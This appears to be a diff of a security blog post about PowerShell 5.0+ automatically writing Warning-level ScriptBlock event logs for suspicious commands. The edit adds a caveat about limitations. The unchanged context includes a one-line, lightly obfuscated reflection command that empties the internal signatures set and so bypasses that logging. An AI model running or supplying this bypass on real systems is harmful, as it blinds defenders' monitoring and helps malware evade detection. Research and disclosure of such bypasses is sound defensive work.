@@ -7,7 +7,7 @@ tags: PowerShell
 
 ## tl;dr
 
-PowerShell 5.0+ automatically logs Warning level ScriptBlock EventLogs when executing "suspicious" commands commonly associated with malware, *even if ScriptBlock logging is not enabled*. This is a one-line bypass of that logging capability:
+PowerShell 5.0+ automatically logs Warning level ScriptBlock EventLogs when executing "suspicious" commands commonly associated with malware, *even if ScriptBlock logging is not enabled*. This is a one-line bypass of that logging capability: (*note: there are limitations, please see the end of this post for more details*)
 
 ```
 PS> [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
